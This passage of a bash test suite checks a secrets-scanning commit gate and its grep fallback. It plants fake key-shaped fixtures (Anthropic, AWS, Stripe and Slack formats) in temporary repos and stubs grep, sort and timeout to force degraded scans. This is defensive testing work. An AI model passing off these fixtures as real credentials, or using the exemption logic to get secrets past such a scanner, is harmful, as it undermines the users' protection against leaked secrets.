OUT="$( cd "$R" && PATH="$NOGL_PATH" bash "$SCRIPT" 2>&1 )"; rc=$?
printf '%s' "$OUT" | grep -Eq 'fallback scan: [1-9][0-9]* file\(s\) scanned' \
  || fail "(c5bis) positive marker missing, got: $OUT"
[ "$rc" -eq 0 ] || fail "(c5bis) EXAMPLE token alone must not block, got $rc"
ok "(c5bis) same token alone on its line => exit 0"

# --- (c5ter) A LIVE CREDENTIAL WEARING `EXAMPLE` STILL BLOCKS =================
# The class-1 HIGH this arm exists for, reproduced from the finding itself: an
# Anthropic key (OPEN length, sk-ant-…{20,}) with `EXAMPLE` glued to its tail.
# The suffix ENTERS the match, so the captured token ended in EXAMPLE and the
# naked `continue` DROPPED it — after which the run printed "1 file(s) scanned,
# 0 finding(s)", a complete and clean scan, and a consumer reads that exact line
# as "the fallback ran to the end, all clear". Stripped, the token is
# still 30+ chars behind `sk-ant-`, so it still matches: it is kept.
# Asserts BOTH halves of the failure: the exit code AND the marker's finding
# count — a `1 finding(s)` marker is what makes the block legible to the consumer.
# MUTATION: restore the naked `case "$tok" in *EXAMPLE) continue ;; esac`
# => exit 0 and `0 finding(s)` => RED.
an_live="sk-""ant-""api03-AbCdEfGhIjKlMnOpQrSt0123456789"
R="$(mk_repo)"; printf 'K=%sEXAMPLE\n' "$an_live" > "$R/creds.txt"
OUT="$( cd "$R" && PATH="$NOGL_PATH" bash "$SCRIPT" 2>&1 )"; rc=$?
[ "$rc" -eq 2 ] \
  || fail "(c5ter) a live credential with an EXAMPLE tail must BLOCK (exit 2), got $rc — $OUT"
printf '%s' "$OUT" | grep -Eq 'fallback scan: [1-9][0-9]* file\(s\) scanned, 1 finding\(s\)' \
  || fail "(c5ter) marker must report 1 finding, got: $OUT"
tail -1 "$R/.agents/state/local/sca-reports/audit-log.jsonl" | grep -q '"creds.txt:1"' \
  || fail "(c5ter) location must be creds.txt:1"
# Same token WITHOUT the tail must block too — otherwise the arm would pass on a
# fixture that was never a credential in the first place.
R="$(mk_repo)"; printf 'K=%s\n' "$an_live" > "$R/creds.txt"
( cd "$R" && PATH="$NOGL_PATH" bash "$SCRIPT" ) >/dev/null 2>&1; rc=$?
[ "$rc" -eq 2 ] || fail "(c5ter) control: the bare credential must block (exit 2), got $rc"
ok "(c5ter) live credential + EXAMPLE tail => exit 2 + '1 finding(s)' (suffix is not a pass)"

# --- (c6) NON-REGRESSION on the REAL repo content (SPECS.json / LEDGER.json) ---
# ADOPTER TREE (S-00004094/S-00004099, gel levé S-00004103): `strip: .agents/state/`
# removes both stores and `.agents/IS_THE_KIT`; LEDGER and SPECS are born at the
# first `ledger.py add` / `specs.py add` (lazy, project_init.py). Copying nothing
# gives "0 file(s) scanned" and a red on day one, so the arm SKIPS out loud — ONLY
# when the kit marker is absent AND neither store exists. In the kit the marker is
# present and the arm stays exigent: a missing store there is still a red.
# MUTATION: drop the marker test => the kit with no stores SKIPS instead of red.
# EACH STORE IN ITS FORM (T-01M4KKMY43ZKCW1YD2Y8JX9MKH): the journal SPECS.jsonl, else
# SPECS.json; LEDGER.json, else the record files of memory/entries/. The marker logic
# is unchanged. MUTATION: copy the monoliths only => a switched-over kit copies
# nothing, "0 file(s) scanned" => RED.
_c6_specs="$REAL_ROOT/.agents/state/specs/SPECS.json"
_c6_journal="$REAL_ROOT/.agents/state/specs/SPECS.jsonl"
_c6_ledger="$REAL_ROOT/.agents/state/memory/LEDGER.json"
_c6_entries="$REAL_ROOT/.agents/state/memory/entries"
if [ ! -f "$REAL_ROOT/.agents/IS_THE_KIT" ] && [ ! -f "$_c6_specs" ] && [ ! -f "$_c6_journal" ] \
  && [ ! -f "$_c6_ledger" ] && [ ! -d "$_c6_entries" ]; then
  echo "  SKIP (c6): arbre adoptant, SPECS/LEDGER pas encore nés"
else
  R="$(mk_repo)"
  if [ -f "$_c6_journal" ]; then
    cp "$_c6_journal" "$R/SPECS.jsonl" 2>/dev/null || true
  else
    cp "$_c6_specs" "$R/SPECS.json" 2>/dev/null || true
  fi
  if [ -f "$_c6_ledger" ]; then
    cp "$_c6_ledger" "$R/LEDGER.json" 2>/dev/null || true
  elif [ -d "$_c6_entries" ]; then
    mkdir -p "$R/entries" && cp "$_c6_entries"/*.json "$R/entries/" 2>/dev/null || true
  fi
  OUT="$( cd "$R" && PATH="$NOGL_PATH" bash "$SCRIPT" 2>&1 )"; rc=$?
  printf '%s' "$OUT" | grep -Eq 'fallback scan: [1-9][0-9]* file\(s\) scanned' \
    || fail "(c6) positive marker missing, got: $OUT"
  [ "$rc" -eq 0 ] || fail "(c6) fallback must not block on real SPECS/LEDGER content (exit 0), got $rc — $OUT"
  ok "(c6) fallback stays clean on the repo's own SPECS and LEDGER, in their present form"
fi

# --- (c7) KILL-SWITCH, both halves -------------------------------------------
R="$(mk_repo)"; printf '%s\n' "$FAKE_SECRET" > "$R/creds.txt"
OUT="$( cd "$R" && PATH="$NOGL_PATH" GITLEAKS_FALLBACK=0 bash "$SCRIPT" 2>&1 )"; rc=$?
[ "$rc" -eq 0 ] || fail "(c7) kill-switch must pass (exit 0), got $rc"
printf '%s' "$OUT" | grep -q "SECRETS GATE" && fail "(c7) kill-switch must not block"
printf '%s' "$OUT" | grep -q "fallback scan: NOT RUN" || fail "(c7) missing NOT RUN marker, got: $OUT"
printf '%s' "$OUT" | grep -q " file(s) scanned" && fail "(c7) NOT RUN must not carry ' file(s) scanned'"
OUT2="$( cd "$R" && PATH="$NOGL_PATH" env -u GITLEAKS_FALLBACK bash "$SCRIPT" 2>&1 )"; rc2=$?
[ "$rc2" -eq 2 ] || fail "(c7) without the kill-switch the same tree must block (exit 2), got $rc2"
ok "(c7) GITLEAKS_FALLBACK=0 passes (NOT RUN); unset blocks"

# --- (c8) BINARIES are skipped (grep -I), no phantom 'Binary file' location ----
R="$(mk_repo)"; { printf 'binary\000\000'; printf '%s\n' "$FAKE_SECRET"; } > "$R/bin.dat"
OUT="$( cd "$R" && PATH="$NOGL_PATH" bash "$SCRIPT" 2>&1 )"; rc=$?
[ "$rc" -eq 0 ] || fail "(c8) a secret inside a binary file must not block (grep -I), got $rc — $OUT"
printf '%s' "$OUT" | grep -qi "Binary file" && fail "(c8) grep -I must suppress the 'Binary file matches' phantom"
ok "(c8) NUL-byte binary carrying a secret => exit 0 (grep -I, declared limit)"

# --- (c9) Slack PROSE is not a secret (a word vs a token) ---------------------
R="$(mk_repo)"
{ printf 'token type: xoxb-REDACTED\n'; printf 'xoxb-example-token\n'; printf 'use your xoxp-your-token-here\n'; } > "$R/doc.md"
OUT="$( cd "$R" && PATH="$NOGL_PATH" bash "$SCRIPT" 2>&1 )"; rc=$?
[ "$rc" -eq 0 ] || fail "(c9) Slack prose must not trip (exit 0), got $rc — $OUT"
printf '%s' "$OUT" | grep -Eq 'fallback scan: [1-9][0-9]* file\(s\) scanned, 0 finding\(s\)' \
  || fail "(c9) expected positive 0-finding marker, got: $OUT"
ok "(c9) Slack prose (xoxb-…, xoxp-…) => exit 0"

# --- (c10) EMPTY DIFF under fallback => exit 0 + '0 file(s) scanned' marker ----
R="$(mk_repo)"
OUT="$( cd "$R" && PATH="$NOGL_PATH" bash "$SCRIPT" 2>&1 )"; rc=$?
[ "$rc" -eq 0 ] || fail "(c10) empty diff must exit 0, got $rc"
printf '%s' "$OUT" | grep -q "nothing to scan" || fail "(c10) missing 'nothing to scan'"
printf '%s' "$OUT" | grep -q "fallback scan: 0 file(s) scanned, 0 finding(s)" \
  || fail "(c10) missing empty-diff marker, got: $OUT"
ok "(c10) empty diff under fallback => exit 0 + '0 file(s) scanned'"

# --- (c11) grep rc>1 => DEGRADED (exit 0), never read as 0 findings ------------
# Stub grep in a PATH PROPER TO THIS ARM (invocation prefix, never export PATH):
# returns 2 ONLY for the fallback signature (-rIoEn); any other form is relayed
# via `command -p grep`, and if the relay itself fails the stub EXITS IN ERROR
# with its reason rather than swallowing a neighbour call (a silent relay is a
# false green).
GSTUB="$(mktemp -d)"; assert_tmpdir "$GSTUB"
{
  printf '#!/usr/bin/env bash\n'
  printf 'if [ "${1:-}" = "-rIoEn" ]; then exit 2; fi\n'
  printf 'command -p grep "$@"; rc=$?\n'
  printf 'if [ "$rc" -ge 126 ]; then echo "stub grep: relay failed for: $*" >&2; exit 97; fi\n'
  printf 'exit "$rc"\n'
} > "$GSTUB/grep"
chmod +x "$GSTUB/grep"
R="$(mk_repo)"; printf '%s\n' "$FAKE_SECRET" > "$R/creds.txt"
OUT="$( cd "$R" && PATH="$GSTUB:$NOGL_PATH" bash "$SCRIPT" 2>&1 )"; rc=$?
[ "$rc" -eq 0 ] || fail "(c11) grep error must DEGRADE (exit 0), got $rc — $OUT"
printf '%s' "$OUT" | grep -q "fallback scan: ABORTED (grep rc 2" || fail "(c11) missing ABORTED (grep rc 2), got: $OUT"
printf '%s' "$OUT" | grep -q " file(s) scanned, " && fail "(c11) an errored scan must not report 'file(s) scanned'"
printf '%s' "$OUT" | grep -q "SECRETS GATE" && fail "(c11) an errored scan must not block"
ok "(c11) grep rc>1 => DEGRADED (exit 0), never a 0-finding"

# --- (c11bis) TIMEOUT => DEGRADED (exit 0) -----------------------------------
# Stub timeout (PATH proper to this arm) exits 124 ONLY when its second arg is
# grep (the fallback wraps grep in timeout); other forms relay via
# `command -p timeout`, and on macOS there is no timeout(1) on the default PATH,
# so the relay FAILS and the stub exits in error with its reason. Its presence
# also makes `have timeout` true on a box without timeout(1).
TSTUB="$(mktemp -d)"; assert_tmpdir "$TSTUB"
{
  printf '#!/usr/bin/env bash\n'
  printf 'if [ "${2:-}" = "grep" ]; then exit 124; fi\n'
  printf 'command -p timeout "$@"; rc=$?\n'
  printf 'if [ "$rc" -ge 126 ]; then echo "stub timeout: no real timeout(1) on default PATH, relay refused for: $*" >&2; exit 97; fi\n'
  printf 'exit "$rc"\n'
} > "$TSTUB/timeout"
chmod +x "$TSTUB/timeout"
R="$(mk_repo)"; printf '%s\n' "$FAKE_SECRET" > "$R/creds.txt"
OUT="$( cd "$R" && PATH="$TSTUB:$NOGL_PATH" bash "$SCRIPT" 2>&1 )"; rc=$?
[ "$rc" -eq 0 ] || fail "(c11bis) timeout must DEGRADE (exit 0), got $rc — $OUT"
printf '%s' "$OUT" | grep -q "fallback scan: ABORTED (timeout " || fail "(c11bis) missing ABORTED (timeout ), got: $OUT"
printf '%s' "$OUT" | grep -q " file(s) scanned, " && fail "(c11bis) a timed-out scan must not report 'file(s) scanned'"
ok "(c11bis) fallback grep timeout => DEGRADED (exit 0)"

# --- (c12) ALLOWLIST honoured as literals, both halves -----------------------
allow_tok="AKIA""QRSTUVWX234567YZ"
R="$(mk_repo)"; printf 'k = %s\n' "$allow_tok" > "$R/creds.txt"
( cd "$R" && PATH="$NOGL_PATH" bash "$SCRIPT" ) >/dev/null 2>&1; rc=$?
[ "$rc" -eq 2 ] || fail "(c12) without allowlist the token must block (exit 2), got $rc"
printf '[allowlist]\nregexes = [\n  %s%s%s,\n]\n' "'''" "$allow_tok" "'''" > "$R/.gitleaks.toml"
OUT2="$( cd "$R" && PATH="$NOGL_PATH" bash "$SCRIPT" 2>&1 )"; rc2=$?
[ "$rc2" -eq 0 ] || fail "(c12) allowlisted token must pass (exit 0), got $rc2 — $OUT2"
printf '%s' "$OUT2" | grep -q "fallback allowlist: 1 literal(s) honoured" || fail "(c12) missing honoured count, got: $OUT2"
printf '%s' "$OUT2" | grep -Eq 'fallback scan: [1-9][0-9]* file\(s\) scanned, 0 finding\(s\)' \
  || fail "(c12) missing 0-finding marker, got: $OUT2"
ok "(c12) .gitleaks.toml [allowlist] regexes honoured as literals (both halves)"

# --- (c12bis) read at EACH run (no relaunch) — DEMONSTRATES the README promise
R="$(mk_repo)"; printf 'k = %s\n' "$allow_tok" > "$R/creds.txt"
( cd "$R" && PATH="$NOGL_PATH" bash "$SCRIPT" ) >/dev/null 2>&1; r1=$?
printf '[allowlist]\nregexes = [\n  %s%s%s,\n]\n' "'''" "$allow_tok" "'''" > "$R/.gitleaks.toml"
( cd "$R" && PATH="$NOGL_PATH" bash "$SCRIPT" ) >/dev/null 2>&1; r2=$?
{ [ "$r1" -eq 2 ] && [ "$r2" -eq 0 ]; } || fail "(c12bis) allowlist must be read EACH run: r1=$r1 r2=$r2 (expected 2 then 0)"
ok "(c12bis) .gitleaks.toml read at each run (no relaunch)"

# --- (c12ter) entries are LITERALS, not regexes (declared limit) --------------
R="$(mk_repo)"; printf 'k = %s\n' "$allow_tok" > "$R/creds.txt"
printf '[allowlist]\nregexes = [\n  %sAKIA.*%s,\n]\n' "'''" "'''" > "$R/.gitleaks.toml"
( cd "$R" && PATH="$NOGL_PATH" bash "$SCRIPT" ) >/dev/null 2>&1; rc=$?
[ "$rc" -eq 2 ] || fail "(c12ter) a regex-looking entry is taken LITERALLY (no match) => exit 2, got $rc"
ok "(c12ter) allowlist entries are literals, not regexes"

# --- (c12quater) the FORM bound is said, not mute: a one-line array => 0 -------
R="$(mk_repo)"; printf 'k = %s\n' "$allow_tok" > "$R/creds.txt"
printf '[allowlist]\nregexes = [%s%s%s]\n' "'''" "$allow_tok" "'''" > "$R/.gitleaks.toml"
OUT="$( cd "$R" && PATH="$NOGL_PATH" bash "$SCRIPT" 2>&1 )"; rc=$?
[ "$rc" -eq 2 ] || fail "(c12quater) a one-line array must yield 0 literals => exit 2, got $rc — $OUT"
printf '%s' "$OUT" | grep -q "fallback allowlist: 0 literal(s) honoured" \
  || fail "(c12quater) the 0-literal limit must be ANNOUNCED, got: $OUT"
ok "(c12quater) one-line array => 0 literals honoured, said out loud"

# --- (c13) the exception is NOT AWS-only: a load-bearing suffix on Stripe too --
# This fixture survives the strip-then-re-test, and it is worth seeing why rather
# than assuming: `sk_live_` + 17 chars + `EXAMPLE` = 24 chars behind the prefix,
# which is exactly the `{24,}` floor — so the suffix is LOAD-BEARING here just as
# it is in AKIAIOSFODNN7EXAMPLE. Cut it and 17 < 24 matches nothing => fixture.
# That is why this arm stayed green through T-00000461 while (c5ter)'s Anthropic
# token — same open-length shape, but 30+ chars WITHOUT the suffix — flipped to
# blocking. Same rule, opposite outcome, decided by the shape and not the word.
st_ex="sk_""live_""ABCDEFGHIJKLMNOPQ""EXAMPLE"
R="$(mk_repo)"; printf 'k = %s\n' "$st_ex" > "$R/creds.txt"
OUT="$( cd "$R" && PATH="$NOGL_PATH" bash "$SCRIPT" 2>&1 )"; rc=$?
[ "$rc" -eq 0 ] || fail "(c13) EXAMPLE suffix must exempt a Stripe token too (exit 0), got $rc — $OUT"
printf '%s' "$OUT" | grep -q "0 finding(s)" || fail "(c13) expected 0 findings, got: $OUT"
ok "(c13) load-bearing EXAMPLE suffix exempts a Stripe token too (17+7 = the {24,} floor)"

# --- (c14) STAGING BOUND (three halves) --------------------------------------
# Each half uses a FRESH identical 3-file tree: a single run writes an audit log
# INTO the temp repo, which would count as a 4th untracked file on a re-run and
# flip the -gt boundary. The plan's "même arbre" means same CONTENT, not reuse.
c14mk() { local R; R="$(mk_repo)"; printf '%s\n' "$FAKE_SECRET" > "$R/creds.txt"; printf 'x\n' > "$R/a.txt"; printf 'y\n' > "$R/b.txt"; printf '%s' "$R"; }
R="$(c14mk)"
OUT="$( cd "$R" && PATH="$NOGL_PATH" GITLEAKS_FALLBACK_MAX_FILES=2 bash "$SCRIPT" 2>&1 )"; rc=$?
[ "$rc" -eq 0 ] || fail "(c14) fallback declines a large staged list (exit 0), got $rc — $OUT"
printf '%s' "$OUT" | grep -q "COVERAGE DEGRADED: fallback declines 3 staged file(s)" || fail "(c14) missing decline notice, got: $OUT"
printf '%s' "$OUT" | grep -q "fallback scan: DECLINED (3 staged" || fail "(c14) missing DECLINED marker, got: $OUT"
printf '%s' "$OUT" | grep -q " file(s) scanned, " && fail "(c14) DECLINED must not report 'file(s) scanned'"
printf '%s' "$OUT" | grep -q "SECRETS GATE" && fail "(c14) DECLINED must not block"
R2="$(c14mk)"
OUT2="$( cd "$R2" && PATH="$NOGL_PATH" GITLEAKS_FALLBACK_MAX_FILES=3 bash "$SCRIPT" 2>&1 )"; rc2=$?
[ "$rc2" -eq 2 ] || fail "(c14) bound is -gt: 3 files not > 3, secret must be found (exit 2), got $rc2 — $OUT2"
if [ "$HAVE_GITLEAKS" -eq 1 ]; then
  R3="$(c14mk)"
  OUT3="$( cd "$R3" && GITLEAKS_FALLBACK_MAX_FILES=2 bash "$SCRIPT" 2>&1 )"; rc3=$?
  [ "$rc3" -eq 2 ] || fail "(c14) gitleaks path must ignore the fallback bound (exit 2), got $rc3"
  printf '%s' "$OUT3" | grep -q "DECLINED" && fail "(c14) gitleaks path must not DECLINE"
  ok "(c14) staging bound declines under fallback; -gt boundary; gitleaks path untouched"
else
  echo "  SKIP (c14) gitleaks half: gitleaks not installed"
  ok "(c14) staging bound declines under fallback; -gt boundary (gitleaks half skipped)"
fi

# --- (c15) A FAILED CENSUS IS NAMED, NEVER RENDERED "clean working tree" ------
# MEDIUM-2. The file list feeding $staged used to be a pipeline whose rc nobody
# read (`{ git diff; git ls-files; } | sort -u`). Break any element — measured
# with `sort` off PATH — and $staged is 0, so the run took the "nothing to scan
# (clean working tree)" branch: two files carrying keys, verdict CLEAN, exit 0.
# Survivable while that only meant a missed scan; NOT survivable once the same
# branch also prints `fallback scan: 0 file(s) scanned, 0 finding(s)`, which
# a consumer reads as a completed sweep and trusts as all clear. "Empty diff"
# and "nothing could be enumerated" are different states and must not share a
# marker. The three census commands now write to files and each rc is read ON
# THE SPOT — never `$?` behind a pipe.
#
# Stub `sort` in a PATH PROPER TO THIS ARM, same shape as (c11)'s grep stub:
# fails ONLY for the census signature (`sort -u -z <file>`, `-u` FIRST: the
# stub keys on it; NUL-separated since T-01M4Y09EY4M664896DMGDTMDXF), relays anything else
# via `command -p sort`, and EXITS IN ERROR if the relay itself fails rather than
# swallowing a neighbour call. `sort` is invoked nowhere else in the script.
# MUTATION: drop the `[ "$CENSUS_OK" = 0 ]` branch so staged=0 is unconditionally
# "clean working tree" => 'nothing to scan' + '0 file(s) scanned, 0 finding(s)'
# + verdict CLEAN => RED on all four assertions below.
SORTSTUB="$(mktemp -d)"; assert_tmpdir "$SORTSTUB"
{
  printf '#!/usr/bin/env bash\n'
  printf 'if [ "${1:-}" = "-u" ]; then exit 3; fi\n'
  printf 'command -p sort "$@"; rc=$?\n'
  printf 'if [ "$rc" -ge 126 ]; then echo "stub sort: relay failed for: $*" >&2; exit 97; fi\n'
  printf 'exit "$rc"\n'
} > "$SORTSTUB/sort"
chmod +x "$SORTSTUB/sort"
c15mk() { local R; R="$(mk_repo)"; printf '%s\n' "$FAKE_SECRET" > "$R/creds.txt"; printf 'K=%s\n' "$an_live" > "$R/creds2.txt"; printf '%s' "$R"; }
R="$(c15mk)"
OUT="$( cd "$R" && PATH="$SORTSTUB:$NOGL_PATH" bash "$SCRIPT" 2>&1 )"; rc=$?
[ "$rc" -eq 0 ] || fail "(c15) a failed census must not BLOCK (benign path, exit 0), got $rc — $OUT"
printf '%s' "$OUT" | grep -q "COVERAGE DEGRADED: file census FAILED" \
  || fail "(c15) a failed census must be ANNOUNCED, got: $OUT"
printf '%s' "$OUT" | grep -q "fallback scan: DEGRADED (file census failed" \
  || fail "(c15) missing the DEGRADED marker, got: $OUT"
printf '%s' "$OUT" | grep -q " file(s) scanned, " \
  && fail "(c15) a failed census must NEVER carry the ' file(s) scanned, ' liberation marker, got: $OUT"
printf '%s' "$OUT" | grep -q "nothing to scan" \
  && fail "(c15) a failed census is not a clean working tree, got: $OUT"
tail -1 "$R/.agents/state/local/sca-reports/audit-log.jsonl" | grep -q '"verdict":"DEGRADED"' \
  || fail "(c15) audit verdict must be DEGRADED, not CLEAN"
# CONTROL — the SAME tree with a working sort finds both keys and blocks. Without
# it this arm would pass on a script that degrades unconditionally.
R2="$(c15mk)"
( cd "$R2" && PATH="$NOGL_PATH" bash "$SCRIPT" ) >/dev/null 2>&1; rc2=$?
[ "$rc2" -eq 2 ] || fail "(c15) control: the same tree with a working sort must block (exit 2), got $rc2"
ok "(c15) failed census => DEGRADED + no liberation marker + audit DEGRADED (control: same tree blocks)"

# --- (c16) THE CENSUS FLAG IS READ BY THE DEFAULT ENGINE'S SINK TOO -----------
# MEDIUM-1. (c15) closed the failed census on the FALLBACK sinks only: $CENSUS_OK
# was read at the two `_fallback_scan` exits and at the staged=0 branch, never at
# the final `SECRETS GATE (class-0): clean.` sink — the one every workstation
# with gitleaks installed actually reaches. So the same non-measure stayed green
# on the NOMINAL configuration: verdict CLEAN, audit CLEAN, exit 0, and no
# degraded line at all for a consumer to read, which reads as all clear.
#
# TRIGGER — REAL, NO STUB (half A): a PARTIAL OBJECT STORE. Drop HEAD's tree
# object and `git diff --name-only HEAD` fails rc=128 while `ls-files --others`
# and `sort` both return 0 — a genuinely partial census, not a simulated one. The
# key sits in a TRACKED, MODIFIED file, i.e. one that ONLY `git diff` enumerates,
# so the perimeter loss is real: gitleaks honestly finds nothing in what it was
# given. The untracked benign file keeps staged>0, which is what routes the run
# past the staged=0 branch and into the sink under test.
# MUTATION: drop the `[ "$CENSUS_OK" = 0 ]` guard before the final clean sink =>
# the trigger prints 'SECRETS GATE (class-0): clean.' + audit CLEAN => RED here.
c16mk() {  # tracked+MODIFIED file carries the key; one untracked benign file
  local R; R="$(mktemp -d)"; assert_tmpdir "$R"
  git -C "$R" init -q 2>/dev/null
  git -C "$R" config user.email t@t.t; git -C "$R" config user.name t
  printf 'seed\n' > "$R/seed.txt"; printf 'K=none\n' > "$R/creds.txt"
  git -C "$R" add -A >/dev/null 2>&1
  git -C "$R" -c commit.gpgsign=false commit -qm seed >/dev/null 2>&1
  printf '%s\n' "$FAKE_SECRET" > "$R/creds.txt"      # tracked, now dirty
  printf 'benign\n' > "$R/untracked.txt"
  printf '%s' "$R"
}
c16break() {  # $1 = repo — remove HEAD's tree object, nothing else
  local t; t="$(git -C "$1" rev-parse "HEAD^{tree}" 2>/dev/null)"
  [ -n "$t" ] || fail "(c16) could not resolve HEAD^{tree}"
  rm -f "$1/.git/objects/${t:0:2}/${t:2}"
}
if [ "$HAVE_GITLEAKS" -eq 1 ]; then
  R="$(c16mk)"; c16break "$R"
  OUT="$( cd "$R" && bash "$SCRIPT" 2>&1 )"; rc=$?
  [ "$rc" -eq 0 ] || fail "(c16) a failed census must not BLOCK (benign path, exit 0), got $rc — $OUT"
  printf '%s' "$OUT" | grep -q "COVERAGE DEGRADED: file census FAILED" \
    || fail "(c16) the default engine must ANNOUNCE the failed census, got: $OUT"
  printf '%s' "$OUT" | grep -q "perimeter INCOMPLETE" \
    || fail "(c16) the degraded line must name the incomplete perimeter, got: $OUT"
  printf '%s' "$OUT" | grep -q "SECRETS GATE (class-0): clean." \
    && fail "(c16) a truncated perimeter must NEVER be reported clean, got: $OUT"
  printf '%s' "$OUT" | grep -q " file(s) scanned, " \
    && fail "(c16) the degraded line must not carry the ' file(s) scanned, ' liberation marker, got: $OUT"
  tail -1 "$R/.agents/state/local/sca-reports/audit-log.jsonl" | grep -q '"verdict":"DEGRADED"' \
    || fail "(c16) audit verdict must be DEGRADED, not CLEAN"
  # PAIRED POSITIVE WITNESS, same tree, census INTACT: gitleaks is handed the
  # modified file and BLOCKS. Proves two things at once — the perimeter loss
  # above was real (that key WAS findable), and this arm is not green by
  # degrading everything.
  R2="$(c16mk)"
  ( cd "$R2" && bash "$SCRIPT" ) >/dev/null 2>&1; rc2=$?
  [ "$rc2" -eq 2 ] || fail "(c16) witness: same tree with an intact census must BLOCK (exit 2), got $rc2"
  ok "(c16) failed census => DEGRADED on the DEFAULT engine (witness: intact census blocks)"
else
  echo "  SKIP (c16) real-gitleaks half: gitleaks not installed"
fi
# Half B — ALWAYS runs, so the default-engine sink is covered on the gitleaks-less
# CI runner too. STUB SAID OUT LOUD, and what it does NOT prove: this stub only
# makes `have gitleaks` true and reports an empty findings array, so it exercises
# the SINK — it proves nothing about gitleaks' own detection, and it cannot show
# that the missed key was findable. That proof is half A's, and it runs wherever
# gitleaks is really installed. The stub reporting `[]` is faithful to the
# scenario: over a truncated perimeter, real gitleaks also finds nothing.
GLSTUB="$(mktemp -d)"; assert_tmpdir "$GLSTUB"
{
  printf '#!/usr/bin/env bash\n'
  printf 'rp=""; prev=""\n'
  printf 'for a in "$@"; do [ "$prev" = "--report-path" ] && rp="$a"; prev="$a"; done\n'
  printf '[ -n "$rp" ] && printf "[]" > "$rp"\n'
  printf 'exit 0\n'
} > "$GLSTUB/gitleaks"
chmod +x "$GLSTUB/gitleaks"
R="$(c16mk)"; c16break "$R"
OUT="$( cd "$R" && PATH="$GLSTUB:$NOGL_PATH" bash "$SCRIPT" 2>&1 )"; rc=$?
[ "$rc" -eq 0 ] || fail "(c16-stub) a failed census must not BLOCK, got $rc — $OUT"
printf '%s' "$OUT" | grep -q "COVERAGE DEGRADED: file census FAILED" \
  || fail "(c16-stub) the default engine must ANNOUNCE the failed census, got: $OUT"
printf '%s' "$OUT" | grep -q "SECRETS GATE (class-0): clean." \
  && fail "(c16-stub) a truncated perimeter must NEVER be reported clean, got: $OUT"
printf '%s' "$OUT" | grep -q "fallback scan:" \
  && fail "(c16-stub) the stub must engage the gitleaks branch, not the fallback, got: $OUT"
tail -1 "$R/.agents/state/local/sca-reports/audit-log.jsonl" | grep -q '"verdict":"DEGRADED"' \
  || fail "(c16-stub) audit verdict must be DEGRADED, not CLEAN"
# PAIRED POSITIVE WITNESS for the stub half: same tree, census INTACT => the sink
# under test still delivers its NORMAL verdict. Without it the guard could be
# degrading unconditionally and this arm would not notice.
R2="$(c16mk)"
OUT2="$( cd "$R2" && PATH="$GLSTUB:$NOGL_PATH" bash "$SCRIPT" 2>&1 )"; rc2=$?
[ "$rc2" -eq 0 ] || fail "(c16-stub) witness: intact census must exit 0, got $rc2 — $OUT2"
printf '%s' "$OUT2" | grep -q "SECRETS GATE (class-0): clean." \
  || fail "(c16-stub) witness: an intact census must still reach the clean sink, got: $OUT2"
printf '%s' "$OUT2" | grep -q "COVERAGE DEGRADED: file census FAILED" \
  && fail "(c16-stub) witness: an intact census must NOT be announced as failed, got: $OUT2"
tail -1 "$R2/.agents/state/local/sca-reports/audit-log.jsonl" | grep -q '"verdict":"CLEAN"' \
  || fail "(c16-stub) witness: audit verdict must be CLEAN when the census ran"
ok "(c16-stub) default-engine sink reads CENSUS_OK on a gitleaks-less host (witness: intact census => CLEAN)"

# --- (c17) A CENSUS THAT NEVER RAN IS NOT AN EMPTY DIFF ----------------------
# MEDIUM-2. The three census commands sit inside `if git rev-parse HEAD`. When
# that head probe fails the whole block is SKIPPED — `ls-files --others`
# included — and $CENSUS_OK kept its optimistic default of 1. Measured, NO STUB:
# a repo with no commit at all (rev-parse rc=128) carrying a live sk-ant- key in
# an UNTRACKED file — the very file `ls-files --others` would have listed. staged
# stayed 0, the run took "nothing to scan (clean working tree)", audit CLEAN, and
# under the fallback it printed `0 file(s) scanned, 0 finding(s)`: the LIBERATION
# marker a consumer reads as a completed sweep. Distinguishing those two states
# is the entire reason this flag exists, so it must be posed on BOTH branches.
# MUTATION: delete the `else CENSUS_OK=0` branch => the no-commit repo prints
# 'nothing to scan' + '0 file(s) scanned, 0 finding(s)' + audit CLEAN => RED.
c17mk() {  # a git repo with NO commit; live key in an untracked file
  local R; R="$(mktemp -d)"; assert_tmpdir "$R"
  git -C "$R" init -q 2>/dev/null
  git -C "$R" config user.email t@t.t; git -C "$R" config user.name t
  printf 'K=%s\n' "$an_live" > "$R/creds.txt"
  printf '%s' "$R"
}
R="$(c17mk)"
OUT="$( cd "$R" && PATH="$NOGL_PATH" bash "$SCRIPT" 2>&1 )"; rc=$?
[ "$rc" -eq 0 ] || fail "(c17) a census that never ran must not BLOCK, got $rc — $OUT"
printf '%s' "$OUT" | grep -q "COVERAGE DEGRADED: file census FAILED" \
  || fail "(c17) a census that never ran must be ANNOUNCED, got: $OUT"
printf '%s' "$OUT" | grep -q " file(s) scanned, " \
  && fail "(c17) a census that never ran must NEVER carry the liberation marker, got: $OUT"
printf '%s' "$OUT" | grep -q "nothing to scan" \
  && fail "(c17) a census that never ran is not a clean working tree, got: $OUT"
tail -1 "$R/.agents/state/local/sca-reports/audit-log.jsonl" | grep -q '"verdict":"DEGRADED"' \
  || fail "(c17) audit verdict must be DEGRADED, not CLEAN"
# PAIRED POSITIVE WITNESS 1 — AN EMPTY DIFF STILL LIBERATES. This is the state
# the flag exists to tell APART from the one above, so it is asserted here and
# not left to (c10): a repo whose census RUNS and returns nothing must keep the
# 'nothing to scan' branch, the '0 file(s) scanned, 0 finding(s)' marker and a
# CLEAN audit. A guard that degraded every quiet tree would be RED right here.
R2="$(mk_repo)"
OUT2="$( cd "$R2" && PATH="$NOGL_PATH" bash "$SCRIPT" 2>&1 )"; rc2=$?
[ "$rc2" -eq 0 ] || fail "(c17) witness: an empty diff must exit 0, got $rc2 — $OUT2"
printf '%s' "$OUT2" | grep -q "nothing to scan" \
  || fail "(c17) witness: an empty diff must still say 'nothing to scan', got: $OUT2"
printf '%s' "$OUT2" | grep -q "fallback scan: 0 file(s) scanned, 0 finding(s)" \
  || fail "(c17) witness: an empty diff must keep its liberation marker, got: $OUT2"
printf '%s' "$OUT2" | grep -q "COVERAGE DEGRADED: file census FAILED" \
  && fail "(c17) witness: a census that RAN must not be announced as failed, got: $OUT2"
tail -1 "$R2/.agents/state/local/sca-reports/audit-log.jsonl" | grep -q '"verdict":"CLEAN"' \
  || fail "(c17) witness: audit verdict must stay CLEAN on an empty diff"
# PAIRED POSITIVE WITNESS 2 — the key in c17mk IS findable. Same file, same
# content, in a repo that HAS a commit: the census runs, `ls-files --others`
